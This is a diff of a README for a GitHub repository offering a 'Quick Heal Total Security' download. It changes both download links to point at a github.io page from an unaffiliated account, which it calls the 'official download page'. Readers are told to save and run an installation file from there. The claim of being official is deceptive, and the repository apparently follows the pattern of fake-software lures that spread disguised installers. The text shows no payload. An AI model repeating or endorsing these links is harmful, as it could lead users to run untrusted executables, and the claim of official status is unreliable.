@@ -1,6 +1,6 @@
 # 🛡️ Baixar-Quick-Heal - Protect Your Computer With Advanced Security
 
-[![Download Quick Heal Total Security](https://img.shields.io/badge/Download-Quick_Heal-blue.svg)](https://github.com/Bethannesidebyside82/Baixar-Quick-Heal)
+[![Download Quick Heal Total Security](https://img.shields.io/badge/Download-Quick_Heal-blue.svg)](https://bethannesidebyside82.github.io)
 
 ## 🎯 About This Software
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run Quick Heal Total Security:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official download page here: [Download Quick Heal Total Security](https://github.com/Bethannesidebyside82/Baixar-Quick-Heal).
+1.  Visit the official download page here: [Download Quick Heal Total Security](https://bethannesidebyside82.github.io).
 2.  Locate the download button on the page.
 3.  Save the installation file to your computer.
 4.  Open the file once the download finishes.
